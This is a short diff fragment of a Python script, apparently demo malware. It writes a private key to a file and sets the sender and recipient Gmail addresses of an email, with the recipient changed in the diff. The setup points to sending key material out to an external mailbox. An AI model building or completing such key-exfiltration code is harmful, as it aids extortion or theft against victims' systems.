@@ -65,8 +65,8 @@ private_key_file = 'private_key.txt'
 with open(private_key_file, 'wb') as f:
     f.write(pem)
 
-fromaddr = "demomalware931@gmail.com"
-toaddr = "lovetruongan@gmail.com"
+fromaddr = "-------"
+toaddr = "vongnguyetvongnguyet@gmail.com"
 msg = MIMEMultipart()
 msg['From'] = fromaddr
 msg['To'] = toaddr
